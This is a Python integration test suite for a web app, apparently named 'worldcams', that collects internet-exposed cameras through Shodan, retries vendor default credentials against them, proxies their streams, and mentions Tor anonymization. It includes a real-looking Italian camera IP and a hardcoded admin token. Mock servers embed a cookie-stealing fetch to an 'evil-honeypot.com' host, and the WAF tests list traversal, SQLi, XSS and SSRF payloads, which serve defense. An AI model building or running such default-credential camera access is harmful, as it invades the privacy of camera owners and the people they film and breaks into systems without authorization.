import asyncio
import sys
from pathlib import Path

# Add project root to path
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from httpx import AsyncClient, ASGITransport
from backend.main import app
from backend.database import init_db

async def test_full_pipeline():
    print("[*] Testing database initialization...")
    await init_db()

    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        # 1. Health check
        print("[*] Testing /api/health...")
        res = await client.get("/api/health")
        assert res.status_code == 200, f"Health check failed: {res.text}"
        data = res.json()
        print("    -> Health:", data)

        # 2. Feeds list
        print("[*] Testing /api/feeds...")
        res = await client.get("/api/feeds")
        assert res.status_code == 200, f"Feeds list failed: {res.text}"
        all_feeds = res.json()
        print(f"    -> Total feeds: {all_feeds['total']}, Retrieved: {len(all_feeds['items'])}")
        if all_feeds["total"] == 0:
            print("[*] Database is empty. Creating test feed for verification...")
            await client.post("/api/feeds", json={
                "ip": "93.66.40.62",
                "port": 8050,
                "product": "Panasonic Network Camera",
                "rtsp_url": "http://93.66.40.62:8050/nphMotionJpeg?Resolution=640x480&Quality=Standard",
                "country_code": "IT",
                "country_name": "Italy"
            })
            res = await client.get("/api/feeds")
            all_feeds = res.json()
        assert all_feeds["total"] > 0, "No feeds found in database!"

        # 2b. Random feed test
        print("[*] Testing /api/feeds/random...")
        rand_res = await client.get("/api/feeds/random")
        assert rand_res.status_code == 200
        rand_feed = rand_res.json()
        assert "id" in rand_feed and "ip" in rand_feed
        print(f"    -> Successfully fetched random feed: {rand_feed['product']} [{rand_feed['ip']}:{rand_feed['port']}]")

        # 3. Facets test
        print("[*] Testing /api/facets...")
        res = await client.get("/api/facets")
        assert res.status_code == 200
        facets = res.json()
        print(f"    -> Countries in facets: {len(facets['countries'])}, Products: {len(facets['products'])}, Favorites: {facets.get('favorites_count', 0)}")
        assert len(facets["countries"]) > 0
        assert "favorites_count" in facets

        # 3b. Favorites filter & toggle test (Admin Only)
        print("[*] Testing Favorites admin-only toggle & filtering...")
        from backend.config import settings
        admin_fav_headers = {"X-Admin-Token": settings.ADMIN_TOKEN}
        sample_feed = all_feeds["items"][0]
        feed_id = sample_feed["id"]

        # Unauthenticated favorite toggle & viewing must be blocked / redacted
        unauth_fav = await client.patch(f"/api/feeds/{feed_id}", json={"is_favorite": True})
        assert unauth_fav.status_code == 401, f"Expected 401 for unauthenticated favorite toggle, got {unauth_fav.status_code}"
        unauth_fav_list = await client.get("/api/feeds?is_favorite=true")
        assert unauth_fav_list.status_code == 401, f"Expected 401 for non-admin /api/feeds?is_favorite=true, got {unauth_fav_list.status_code}"

        # Mark as favorite with valid Admin Token
        fav_patch = await client.patch(f"/api/feeds/{feed_id}", json={"is_favorite": True}, headers=admin_fav_headers)
        assert fav_patch.status_code == 200
        assert fav_patch.json()["is_favorite"] is True

        # Non-admin single feed & facets must redact favorite state/count
        pub_feed = (await client.get(f"/api/feeds/{feed_id}")).json()
        assert pub_feed["is_favorite"] is False, "Non-admin GET /api/feeds/{id} must redact is_favorite!"
        pub_facets = (await client.get("/api/facets")).json()
        assert pub_facets["favorites_count"] == 0, "Non-admin /api/facets must redact favorites_count!"

        # Query favorites as Admin
        fav_res = await client.get("/api/feeds?is_favorite=true", headers=admin_fav_headers)
        assert fav_res.status_code == 200
        fav_items = fav_res.json()["items"]
        assert any(f["id"] == feed_id for f in fav_items), "Favorited feed not found in /api/feeds?is_favorite=true"

        # Check facets updated for Admin
        facets_updated = (await client.get("/api/facets", headers=admin_fav_headers)).json()
        assert facets_updated["favorites_count"] >= 1

        # Unmark favorite with valid Admin Token
        unfav_patch = await client.patch(f"/api/feeds/{feed_id}", json={"is_favorite": False}, headers=admin_fav_headers)
        assert unfav_patch.status_code == 200
        assert unfav_patch.json()["is_favorite"] is False
        print(f"    -> Successfully verified admin-only favorite toggle/viewing, redaction, DB persistence, and /api/feeds?is_favorite=true filter.")

        # 4. Education articles
        print("[*] Testing /api/education/articles...")
        res = await client.get("/api/education/articles")
        assert res.status_code == 200
        articles = res.json()
        print(f"    -> Articles count: {len(articles)}")
        assert len(articles) >= 3

        # 5. Stream registration
        print("[*] Testing /api/streams/play...")
        sample_feed = all_feeds["items"][0]
        res = await client.post("/api/streams/play", json={
            "feed_id": sample_feed["id"]
        })
        assert res.status_code == 200
        stream = res.json()
        print(f"    -> Stream route ready: {stream['webrtc_whep_url']}")

        # 5b. Stream registration with remote VPS Host header
        res_remote = await client.post(
            "/api/streams/play",
            json={"feed_id": sample_feed["id"]},
            headers={"Host": "198.51.100.25:8000"}
        )
        assert res_remote.status_code == 200
        remote_stream = res_remote.json()
        if remote_stream["webrtc_url"]:
            assert "198.51.100.25" in remote_stream["webrtc_url"], f"Host not rewritten: {remote_stream['webrtc_url']}"
            print(f"    -> Remote client host rewritten: {remote_stream['webrtc_url']}")

        # 6. Shodan Account Info check
        print("[*] Testing /api/shodan/info...")
        res = await client.get("/api/shodan/info")
        assert res.status_code == 200
        info = res.json()
        print(f"    -> Shodan Info: Active={info.get('active')}, Configured={info.get('configured')}, Message={info.get('message')}")
        assert info.get("active") is True, f"Expected active API key: {info}"

        # 7. Admin Token protection
        print("[*] Testing Admin Token protection...")
        # Unauthenticated search should fail with 401
        res = await client.post("/api/shodan/search", json={
            "query": "webcam",
            "limit": 2,
            "import_to_db": False
        })
        assert res.status_code == 401, f"Expected 401 Unauthorized, got {res.status_code}"

        # Authenticated verify with admin token
        headers = {"X-Admin-Token": "worldcams-admin-2026"}
        res = await client.post("/api/admin/verify", headers=headers)
        assert res.status_code == 200 and res.json().get("valid") is True

        # Batch delete endpoint test with mock feed IDs
        res = await client.post("/api/feeds/batch-delete", json={"feed_ids": ["non-existent-1", "non-existent-2"]}, headers=headers)
        assert res.status_code == 200
        print(f"    -> Batch delete response: {res.json()}")

        # 9. RTSP Resolver Endpoint Test
        print("[*] Testing /api/streams/resolve-rtsp...")
        res = await client.post("/api/streams/resolve-rtsp", json={
            "feed_id": sample_feed["id"],
            "ip": sample_feed["ip"],
            "port": sample_feed["port"],
            "product": sample_feed["product"]
        })
        assert res.status_code == 200, f"Resolver failed: {res.text}"
        resolve_data = res.json()
        print(f"    -> Resolver response: vendor={resolve_data.get('vendor')}, resolved={resolve_data.get('resolved')}, tested_count={resolve_data.get('tested_count')}")
        assert "resolved" in resolve_data
        assert "stream_url" in resolve_data
        assert "tested_count" in resolve_data

        # 10. HTTP Stream Proxy Test
        print("[*] Testing /api/proxy/stream...")
        res = await client.get(f"/api/proxy/stream?feed_id={sample_feed['id']}")
        assert res.status_code in (200, 302, 301), f"Proxy failed: status={res.status_code}"
        print(f"    -> Proxy stream active: status={res.status_code}, content-type={res.headers.get('content-type')}")

        # 11. Vendor Default Credential Profiles & Retry Verification Test
        print("[*] Testing Vendor Default Credentials from VENDOR_RTSP_PROFILES & /api/streams/retry-default-creds...")
        from backend.services.rtsp_resolver import rtsp_resolver, VENDOR_RTSP_PROFILES

        for vendor, profile in VENDOR_RTSP_PROFILES.items():
            creds = rtsp_resolver.get_vendor_credentials(vendor)
            expected_creds = profile["creds"]
            assert creds == expected_creds and len(creds) > 0, f"Credentials mismatch for {vendor}: expected {expected_creds}, got {creds}"
            print(f"    -> Vendor {vendor:<16} creds verified ({len(creds)} pairs): {creds[:3]}")

        # Samsung alias check for Hanwha
        samsung_creds = rtsp_resolver.get_vendor_credentials("Samsung Techwin Camera")
        assert ("admin", "4356") in samsung_creds, f"Samsung alias missing ('admin', '4356'): {samsung_creds}"
        print(f"    -> Samsung alias verified: {samsung_creds}")

        # Test retry-default-creds endpoint
        res = await client.post("/api/streams/retry-default-creds", json={
            "feed_id": sample_feed["id"],
            "ip": sample_feed["ip"],
            "port": sample_feed["port"],
            "product": "Hikvision DS-2CD2042WD-I"
        })
        assert res.status_code == 200, f"Retry default creds endpoint failed: {res.text}"
        retry_data = res.json()
        assert retry_data["vendor"] == "hikvision"
        assert retry_data["tested_count"] == len(VENDOR_RTSP_PROFILES["hikvision"]["creds"])
        print(f"    -> /api/streams/retry-default-creds response: vendor={retry_data['vendor']}, tested_count={retry_data['tested_count']}")

        # 12. Live Mock RTSP Server Test (Digest & Basic Auth + Default Creds Retry)
        print("[*] Testing live RTSP default-creds retry against Mock RTSP Server (Digest & Basic Auth)...")
        import hashlib
        import base64
        import re

        async def handle_mock_rtsp(reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
            conn_nonce = "mocknonce98765"
            realm = "Hikvision"
            expected_user = "admin"
            expected_pass = "12345"
            try:
                while True:
                    data = await asyncio.wait_for(reader.read(2048), timeout=2.0)
                    if not data:
                        break
                    req_text = data.decode(errors="ignore")
                    first_line = req_text.splitlines()[0] if req_text.splitlines() else ""
                    parts = first_line.split()
                    if len(parts) < 2:
                        break
                    method, uri = parts[0], parts[1]
                    cseq_m = re.search(r"CSeq:\s*(\d+)", req_text, re.IGNORECASE)
                    cseq = cseq_m.group(1) if cseq_m else "1"

                    # Only accept /Streaming/Channels/101
                    if not uri.endswith("/Streaming/Channels/101"):
                        resp = f"RTSP/1.0 404 Not Found\r\nCSeq: {cseq}\r\n\r\n"
                        writer.write(resp.encode())
                        await writer.drain()
                        continue

                    auth_m = re.search(r"Authorization:\s*(.+)", req_text, re.IGNORECASE)
                    if not auth_m:
                        resp = (
                            f"RTSP/1.0 401 Unauthorized\r\n"
                            f"CSeq: {cseq}\r\n"
                            f'WWW-Authenticate: Digest realm="{realm}", nonce="{conn_nonce}"\r\n\r\n'
                        )
                        writer.write(resp.encode())
                        await writer.drain()
                        continue

                    auth_val = auth_m.group(1).strip()
                    ha1 = hashlib.md5(f"{expected_user}:{realm}:{expected_pass}".encode()).hexdigest()
                    ha2 = hashlib.md5(f"{method}:{uri}".encode()).hexdigest()
                    expected_resp = hashlib.md5(f"{ha1}:{conn_nonce}:{ha2}".encode()).hexdigest()

                    if f'username="{expected_user}"' in auth_val and f'response="{expected_resp}"' in auth_val:
                        sdp = "v=0\r\nm=video 0 RTP/AVP 96\r\na=rtpmap:96 H264/90000\r\n"
                        resp = (
                            f"RTSP/1.0 200 OK\r\n"
                            f"CSeq: {cseq}\r\n"
                            f"Content-Type: application/sdp\r\n"
                            f"Content-Length: {len(sdp)}\r\n\r\n{sdp}"
                        )
                        writer.write(resp.encode())
                        await writer.drain()
                    else:
                        resp = (
                            f"RTSP/1.0 401 Unauthorized\r\n"
                            f"CSeq: {cseq}\r\n"
                            f'WWW-Authenticate: Digest realm="{realm}", nonce="{conn_nonce}"\r\n\r\n'
                        )
                        writer.write(resp.encode())
                        await writer.drain()
            except Exception:
                pass
            finally:
                writer.close()

        mock_server = await asyncio.start_server(handle_mock_rtsp, "127.0.0.1", 0)
        mock_port = mock_server.sockets[0].getsockname()[1]
        try:
            # Test A: retry_rtsp_with_default_creds when initial path is placeholder '/live'
            ok_retry, resolved_rtsp_url, cred_used = await rtsp_resolver.retry_rtsp_with_default_creds(
                ip="127.0.0.1",
                port=mock_port,
                path="/live",
                product="Hikvision IP Camera"
            )
            assert ok_retry is True, "Expected retry_rtsp_with_default_creds to succeed against mock Hikvision server"
            assert cred_used == ("admin", "12345"), f"Expected ('admin', '12345'), got {cred_used}"
            assert resolved_rtsp_url == f"rtsp://admin:12345@127.0.0.1:{mock_port}/Streaming/Channels/101"
            print(f"    -> Direct retry from '/live' succeeded: {resolved_rtsp_url}")

            # Test B: Full /api/streams/play flow with a feed requiring default creds
            from backend.database import AsyncSessionLocal, CameraFeedModel
            mock_feed_id = f"test_mock_rtsp_{mock_port}"
            async with AsyncSessionLocal() as db_sess:
                db_sess.add(CameraFeedModel(
                    id=mock_feed_id,
                    ip="127.0.0.1",
                    port=mock_port,
                    product="Hikvision DS-2CD2142FWD-I",
                    rtsp_url=f"rtsp://127.0.0.1:{mock_port}/Streaming/Channels/101",
                    stream_path=mock_feed_id,
                    country_code="IT",
                    country_name="Italy"
                ))
                await db_sess.commit()

            play_res = await client.post("/api/streams/play", json={"feed_id": mock_feed_id})
            assert play_res.status_code == 200
            play_data = play_res.json()
            assert f"rtsp://admin:12345@127.0.0.1:{mock_port}/Streaming/Channels/101" == play_data["rtsp_source"], (
                f"Expected auto-authenticated rtsp_source, got {play_data['rtsp_source']}"
            )
            print(f"    -> /api/streams/play auto-authenticated RTSP source: {play_data['rtsp_source']}")

            # Clean up test feed
            await client.post("/api/feeds/batch-delete", json={"feed_ids": [mock_feed_id]}, headers=headers)
        finally:
            mock_server.close()
            await mock_server.wait_closed()

        # 13. Live Mock HTTP Camera Test (Ports 8080 / 8000 MJPEG & Snapshot + &amp; / COUNTER cleanup)
        print("[*] Testing HTTP Live Camera Stream Resolution & Proxy (port 8080/8000 simulation)...")
        JPEG_SOI_EOI = b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xff\xd9"

        async def handle_mock_http_cam(reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
            try:
                data = await asyncio.wait_for(reader.read(2048), timeout=2.0)
                req_text = data.decode(errors="ignore")
                first_line = req_text.splitlines()[0] if req_text.splitlines() else ""
                path = first_line.split()[1] if len(first_line.split()) >= 2 else "/"

                if path.startswith("/nphMotionJpeg?Resolution=640x480&Quality=Standard"):
                    frame = (
                        b"--myboundary\r\nContent-Type: image/jpeg\r\n"
                        + f"Content-Length: {len(JPEG_SOI_EOI)}\r\n\r\n".encode()
                        + JPEG_SOI_EOI + b"\r\n"
                    )
                    hdr = (
                        b"HTTP/1.1 200 OK\r\n"
                        b"Content-Type: multipart/x-mixed-replace; boundary=myboundary\r\n"
                        b"Cache-Control: no-cache\r\n\r\n"
                    )
                    writer.write(hdr + frame)
                    await writer.drain()
                elif path.startswith("/cgi-bin/faststream.jpg") and "COUNTER" not in path and "&amp;" not in path:
                    hdr = (
                        b"HTTP/1.1 200 OK\r\nContent-Type: image/jpeg\r\n"
                        + f"Content-Length: {len(JPEG_SOI_EOI)}\r\n\r\n".encode()
                    )
                    writer.write(hdr + JPEG_SOI_EOI)
                    await writer.drain()
                else:
                    writer.write(b"HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\n\r\n")
                    await writer.drain()
            except Exception:
                pass
            finally:
                writer.close()

        http_cam_server = await asyncio.start_server(handle_mock_http_cam, "127.0.0.1", 0)
        http_cam_port = http_cam_server.sockets[0].getsockname()[1]
        try:
            # Test 13a: Feed with dummy '/live' URL on HTTP camera gets auto-resolved to real MJPEG stream
            http_feed_id = f"test_mock_http_{http_cam_port}"
            async with AsyncSessionLocal() as db_sess:
                db_sess.add(CameraFeedModel(
                    id=http_feed_id,
                    ip="127.0.0.1",
                    port=http_cam_port,
                    product="Panasonic Bl-c121a Network Camera",
                    rtsp_url=f"http://127.0.0.1:{http_cam_port}/live",
                    stream_path=http_feed_id,
                    country_code="JP",
                    country_name="Japan"
                ))
                await db_sess.commit()

            play_http_res = await client.post("/api/streams/play", json={"feed_id": http_feed_id})
            assert play_http_res.status_code == 200
            play_http_data = play_http_res.json()
            assert play_http_data["status"] == "http_stream"
            assert play_http_data["stream_type"] == "mjpeg"
            assert "/nphMotionJpeg?Resolution=640x480&Quality=Standard" in play_http_data["rtsp_source"], (
                f"Expected resolved MJPEG URL, got {play_http_data}"
            )
            print(f"    -> HTTP camera with '/live' auto-resolved to MJPEG: {play_http_data['rtsp_source']}")

            # Test 13b: Proxy stream serves the resolved MJPEG stream
            proxy_res = await client.get(f"/api/proxy/stream?feed_id={http_feed_id}")
            assert proxy_res.status_code == 200
            assert "multipart/x-mixed-replace" in proxy_res.headers.get("content-type", "")
            assert JPEG_SOI_EOI in proxy_res.content
            print("    -> /api/proxy/stream verified serving multipart MJPEG bytes")

            # Test 13c: Proxy stream cleans '&amp;' and replaces 'COUNTER' in Mobotix/Axis URLs
            dirty_url = f"http://127.0.0.1:{http_cam_port}/cgi-bin/faststream.jpg?stream=full&amp;fps=15&amp;rand=COUNTER"
            proxy_dirty_res = await client.get("/api/proxy/stream", params={"url": dirty_url})
            assert proxy_dirty_res.status_code == 200, f"Expected 200 after cleaning &amp; and COUNTER, got {proxy_dirty_res.status_code}"
            assert proxy_dirty_res.content == JPEG_SOI_EOI
            print("    -> /api/proxy/stream verified cleaning '&amp;' and 'COUNTER' tokens")

            await client.post("/api/feeds/batch-delete", json={"feed_ids": [http_feed_id]}, headers=headers)
        finally:
            http_cam_server.close()
            await http_cam_server.wait_closed()

        # 14. End-to-End MediaMTX + RTSP Player Pipeline Verification
        print("[*] Testing End-to-End MediaMTX RTSP -> WebRTC/HLS Gateway Pipeline...")
        from backend.services.mediamtx_service import mediamtx_service
        import subprocess
        await mediamtx_service.start()
        assert await mediamtx_service.is_running() is True, "MediaMTX failed to start!"

        # Publish a real live H.264 stream into MediaMTX on a simulated camera endpoint
        # and verify that registering a camera path pulling from it becomes ready=True with H264 frames
        pub_proc = subprocess.Popen(
            [
                "ffmpeg", "-re", "-f", "lavfi", "-i", "testsrc=size=320x240:rate=15",
                "-c:v", "libx264", "-g", "15", "-preset", "ultrafast", "-tune", "zerolatency", "-pix_fmt", "yuv420p",
                "-rtsp_transport", "tcp", "-f", "rtsp", "rtsp://127.0.0.1:8554/live_cam_src"
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        rtsp_feed_id = "test_live_mediamtx_rtsp"
        try:
            # Create a feed pointing to our live H264 RTSP camera source
            async with AsyncSessionLocal() as db_sess:
                await db_sess.merge(CameraFeedModel(
                    id=rtsp_feed_id,
                    ip="127.0.0.1",
                    port=8554,
                    product="Axis M3045-V Network Camera",
                    rtsp_url="rtsp://127.0.0.1:8554/live_cam_src",
                    stream_path=rtsp_feed_id,
                    country_code="SE",
                    country_name="Sweden"
                ))
                await db_sess.commit()

            # Wait briefly for ffmpeg publisher to initialize
            await asyncio.sleep(1.2)

            # Call /api/streams/play just like StreamPlayer.playFeed() does
            play_rtsp_res = await client.post("/api/streams/play", json={
                "feed_id": rtsp_feed_id,
                "rtsp_url": "rtsp://127.0.0.1:8554/live_cam_src",
                "stream_name": rtsp_feed_id
            })
            assert play_rtsp_res.status_code == 200
            play_rtsp_data = play_rtsp_res.json()
            stream_path = play_rtsp_data["stream_path"]
            assert play_rtsp_data["webrtc_url"].endswith(f"/{stream_path}")

            # Poll /api/streams/status/{stream_path} just like StreamPlayer.monitorRtspTelemetry() does
            stream_ready = False
            status_payload = {}
            for _ in range(8):
                await asyncio.sleep(0.5)
                st_res = await client.get(f"/api/streams/status/{stream_path}")
                assert st_res.status_code == 200
                status_payload = st_res.json()
                if status_payload.get("ready") and status_payload.get("bytes_received", 0) > 0:
                    stream_ready = True
                    break

            assert stream_ready is True, f"MediaMTX RTSP stream never became ready: {status_payload}"
            assert status_payload.get("codec") == "H264", f"Expected H264 codec, got {status_payload}"
            print(
                f"    -> MediaMTX RTSP Telemetry Verified: ready={status_payload['ready']}, "
                f"codec={status_payload['codec']}, res={status_payload['resolution']}, "
                f"bytes={status_payload['bytes_received']}"
            )

            # Stop the stream
            stop_res = await client.post("/api/streams/stop", json={"stream_name": stream_path})
            assert stop_res.status_code == 200
        finally:
            await client.post("/api/feeds/batch-delete", json={"feed_ids": [rtsp_feed_id]}, headers=headers)
            pub_proc.terminate()
            try:
                pub_proc.wait(timeout=2)
            except Exception:
                pub_proc.kill()
            mediamtx_service.stop()

        # 15. Anti-Honeypot Web Portal Stream Source Extraction & Zero Code Execution
        print("[*] Testing Anti-Honeypot Web Portal Stream Extraction & Disguised Malware Blocking...")
        async def handle_honeypot_cam(reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
            try:
                data = await asyncio.wait_for(reader.read(2048), timeout=2.0)
                req_text = data.decode(errors="ignore")
                first_line = req_text.splitlines()[0] if req_text.splitlines() else ""
                path = first_line.split()[1] if len(first_line.split()) >= 2 else "/"

                if path == "/" or path.startswith("/index.html") or path == "/live":
                    # Simulated camera web portal containing malicious scripts + embedded stream source
                    portal_html = (
                        b"<html><head><title>Camera Web Portal</title>"
                        b"<script>fetch('http://evil-honeypot.com/steal?c='+document.cookie);</script>"
                        b"</head><body onload='evilMalware()'>"
                        b"<iframe src='http://evil-honeypot.com/exploit.html'></iframe>"
                        b"<img id='cam' src='/custom_vendor_stream/live_feed.mjpg?ch=1'>"
                        b"</body></html>"
                    )
                    hdr = (
                        b"HTTP/1.1 200 OK\r\n"
                        b"Content-Type: text/html; charset=utf-8\r\n"
                        + f"Content-Length: {len(portal_html)}\r\n\r\n".encode()
                    )
                    writer.write(hdr + portal_html)
                    await writer.drain()
                elif path.startswith("/custom_vendor_stream/live_feed.mjpg"):
                    frame = (
                        b"--myboundary\r\nContent-Type: image/jpeg\r\n"
                        + f"Content-Length: {len(JPEG_SOI_EOI)}\r\n\r\n".encode()
                        + JPEG_SOI_EOI + b"\r\n"
                    )
                    hdr = (
                        b"HTTP/1.1 200 OK\r\n"
                        b"Content-Type: multipart/x-mixed-replace; boundary=myboundary\r\n\r\n"
                    )
                    writer.write(hdr + frame)
                    await writer.drain()
                elif path.startswith("/malware_disguised.jpg"):
                    # Honeypot serving a Windows PE executable disguised as image/jpeg
                    pe_payload = b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00This program cannot be run in DOS mode"
                    hdr = (
                        b"HTTP/1.1 200 OK\r\n"
                        b"Content-Type: image/jpeg\r\n"
                        + f"Content-Length: {len(pe_payload)}\r\n\r\n".encode()
                    )
                    writer.write(hdr + pe_payload)
                    await writer.drain()
                elif path.startswith("/xss_disguised.jpg"):
                    # Honeypot serving HTML/JS disguised as image/jpeg
                    xss_payload = b"<html><script>alert('honeypot-xss')</script></html>"
                    hdr = (
                        b"HTTP/1.1 200 OK\r\n"
                        b"Content-Type: image/jpeg\r\n"
                        + f"Content-Length: {len(xss_payload)}\r\n\r\n".encode()
                    )
                    writer.write(hdr + xss_payload)
                    await writer.drain()
                else:
                    writer.write(b"HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\n\r\n")
                    await writer.drain()
            except Exception:
                pass
            finally:
                writer.close()

        hp_server = await asyncio.start_server(handle_honeypot_cam, "127.0.0.1", 0)
        hp_port = hp_server.sockets[0].getsockname()[1]
        hp_feed_id = f"test_honeypot_portal_{hp_port}"
        try:
            async with AsyncSessionLocal() as db_sess:
                db_sess.add(CameraFeedModel(
                    id=hp_feed_id,
                    ip="127.0.0.1",
                    port=hp_port,
                    product="Web Portal Camera",
                    rtsp_url=f"http://127.0.0.1:{hp_port}/live",
                    stream_path=hp_feed_id,
                    country_code="IT",
                    country_name="Italy"
                ))
                await db_sess.commit()

            # 15a. /api/streams/play extracts the embedded custom stream path from the HTML portal without executing JS
            hp_play_res = await client.post("/api/streams/play", json={"feed_id": hp_feed_id})
            assert hp_play_res.status_code == 200
            hp_play_data = hp_play_res.json()
            assert hp_play_data["status"] == "http_stream"
            assert "/custom_vendor_stream/live_feed.mjpg?ch=1" in hp_play_data["rtsp_source"], (
                f"Expected portal stream extraction, got {hp_play_data}"
            )
            print(f"    -> Portal HTML parsed & stream source extracted: {hp_play_data['rtsp_source']}")

            # 15b. /api/proxy/stream pointing directly to the HTML portal root extracts & streams the binary MJPEG
            hp_stream_res = await client.get("/api/proxy/stream", params={"url": f"http://127.0.0.1:{hp_port}/"})
            assert hp_stream_res.status_code == 200
            assert JPEG_SOI_EOI in hp_stream_res.content
            assert b"<script>" not in hp_stream_res.content
            assert hp_stream_res.headers.get("x-extracted-stream-source", "").endswith("/custom_vendor_stream/live_feed.mjpg?ch=1")
            print("    -> /api/proxy/stream automatically extracted MJPEG from HTML portal and stripped all scripts")

            # 15c. /api/proxy/web never returns executable HTML/scripts; returns isolated JSON/report with script-src 'none'
            hp_web_json = await client.get(f"/api/proxy/web?feed_id={hp_feed_id}&format=json")
            assert hp_web_json.status_code == 200
            web_info = hp_web_json.json()
            assert web_info["isolated"] is True and web_info["code_execution_blocked"] is True
            assert "/custom_vendor_stream/live_feed.mjpg?ch=1" in (web_info.get("extracted_stream_url") or "")

            hp_web_html = await client.get(f"/api/proxy/web?feed_id={hp_feed_id}")
            assert hp_web_html.status_code == 200
            assert "script-src 'none'" in hp_web_html.headers.get("content-security-policy", "")
            assert b"<script>fetch(" not in hp_web_html.content
            assert b"onload='evilMalware()'" not in hp_web_html.content
            print("    -> /api/proxy/web verified zero code execution & strict sandbox CSP")

            # 15d. Disguised PE executable (MZ) and disguised HTML (<script>) on /api/proxy/stream are blocked with 415
            pe_res = await client.get("/api/proxy/stream", params={"url": f"http://127.0.0.1:{hp_port}/malware_disguised.jpg"})
            assert pe_res.status_code == 415, f"Expected 415 for disguised PE binary, got {pe_res.status_code}"
            xss_img_res = await client.get("/api/proxy/stream", params={"url": f"http://127.0.0.1:{hp_port}/xss_disguised.jpg"})
            assert xss_img_res.status_code == 415, f"Expected 415 for disguised HTML/JS payload, got {xss_img_res.status_code}"
            print("    -> Disguised PE executable ('MZ') and HTML/JS payloads blocked with HTTP 415")

            await client.post("/api/feeds/batch-delete", json={"feed_ids": [hp_feed_id]}, headers=headers)
        finally:
            hp_server.close()
            await hp_server.wait_closed()

        # 16. WAF, Path Traversal, SQL Injection, XSS, SSRF, Bot Scanner, and CSRF Defenses
        print("[*] Testing WAF & Security Hardening (Path Traversal, SQLi, XSS, SSRF, Scanners, CSRF)...")

        # 16a. Path Traversal & Sensitive File Probes
        for pt_path in ["/../etc/passwd", "/api/feeds/..%2f..%2fetc/passwd", "/.env", "/.git/config", "/world_cams.db"]:
            pt_res = await client.get(pt_path)
            assert pt_res.status_code == 403, f"Expected 403 for path traversal/sensitive probe {pt_path}, got {pt_res.status_code}"
        print("    -> Path traversal & sensitive file probes blocked (403)")

        # 16b. SQL Injection Payloads
        for sqli_q in ["' OR 1=1--", "test' UNION SELECT null,null--", "1; DROP TABLE camera_feeds--"]:
            sqli_res = await client.get("/api/feeds", params={"search": sqli_q})
            assert sqli_res.status_code == 403, f"Expected 403 for SQLi payload '{sqli_q}', got {sqli_res.status_code}"
        print("    -> SQL Injection payloads blocked (403)")

        # 16c. Reflected/Stored XSS Payloads
        xss_res = await client.get("/api/feeds", params={"search": "<script>alert(1)</script>"})
        assert xss_res.status_code == 403, f"Expected 403 for XSS query, got {xss_res.status_code}"
        print("    -> XSS query payloads blocked (403)")

        # 16d. Automated Vulnerability Scanner User-Agents
        bot_res = await client.get("/api/feeds", headers={"User-Agent": "sqlmap/1.7.2#stable (https://sqlmap.org)"})
        assert bot_res.status_code == 403, f"Expected 403 for sqlmap User-Agent, got {bot_res.status_code}"
        print("    -> Automated scanner User-Agent ('sqlmap') blocked (403)")

        # 16e. SSRF Protection (Cloud Metadata, Internal MediaMTX API, Restricted Ports)
        for ssrf_url in [
            "http://169.254.169.254/latest/meta-data/",
            "http://127.0.0.1:9997/v3/paths/list",
            "http://127.0.0.1:8000/api/health",
            "http://127.0.0.1:22/",
            "http://localhost/live"
        ]:
            ssrf_res = await client.get("/api/proxy/stream", params={"url": ssrf_url})
            assert ssrf_res.status_code == 403, f"Expected 403 for SSRF URL {ssrf_url}, got {ssrf_res.status_code}"
        print("    -> SSRF targets (Cloud Metadata, MediaMTX API, SSH port, DNS hostname) blocked (403)")

        # 16f. CSRF Protection (Cross-Origin, Form-Encoded POST, and Double-Submit Cookie Enforcement)
        csrf_origin_res = await client.post(
            "/api/streams/stop",
            json={"stream_name": "test"},
            headers={"Origin": "https://evil-csrf-site.com"}
        )
        assert csrf_origin_res.status_code == 403, f"Expected 403 for cross-origin POST, got {csrf_origin_res.status_code}"

        csrf_form_res = await client.post(
            "/api/streams/stop",
            content="stream_name=test",
            headers={"Content-Type": "application/x-www-form-urlencoded"}
        )
        assert csrf_form_res.status_code == 403, f"Expected 403 for form-encoded CSRF POST, got {csrf_form_res.status_code}"

        # Initialize CSRF session cookie via /api/security/csrf and verify token enforcement
        csrf_init = await client.get("/api/security/csrf")
        assert csrf_init.status_code == 200
        csrf_token = csrf_init.json()["csrf_token"]
        assert "worldcams_csrf" in client.cookies

        # State-changing request with cookie present but missing X-CSRF-Token header -> 403
        no_hdr_res = await client.post("/api/streams/stop", json={"stream_name": "test"})
        assert no_hdr_res.status_code == 403, f"Expected 403 when CSRF cookie set but X-CSRF-Token missing, got {no_hdr_res.status_code}"

        # State-changing request with matching X-CSRF-Token header -> 200
        valid_csrf_res = await client.post(
            "/api/streams/stop",
            json={"stream_name": "test"},
            headers={"X-CSRF-Token": csrf_token}
        )
        assert valid_csrf_res.status_code == 200, f"Expected 200 with valid X-CSRF-Token, got {valid_csrf_res.status_code}"

        # Stale/invalid cookie self-healing on /api/security/csrf + same-origin browser fetch verification
        client.cookies.set("worldcams_csrf", "stale_nonce.invalid_signature")
        healed_res = await client.get("/api/security/csrf")
        assert healed_res.status_code == 200
        healed_token = healed_res.json()["csrf_token"]
        assert healed_token != "stale_nonce.invalid_signature", "Expected stale CSRF cookie to be replaced with valid token"

        same_origin_browser_res = await client.post(
            "/api/streams/stop",
            json={"stream_name": "test"},
            headers={"Sec-Fetch-Site": "same-origin", "Origin": "http://127.0.0.1:8000"}
        )
        assert same_origin_browser_res.status_code == 200, "Expected same-origin browser JSON fetch to succeed"

        cross_site_fetch_res = await client.post(
            "/api/streams/stop",
            json={"stream_name": "test"},
            headers={"Sec-Fetch-Site": "cross-site", "X-CSRF-Token": healed_token}
        )
        assert cross_site_fetch_res.status_code == 403, "Expected Sec-Fetch-Site: cross-site to be blocked with 403"
        print("    -> CSRF protection (Origin, Form Content-Type, Double-Submit HMAC, Cookie Self-Healing, Sec-Fetch-Site) verified")

        # 17. Tor Anonymizer Proxy, Circuit Rotation (IsolateSocksAuth), RTSP Bridge & Fail-Closed Protection
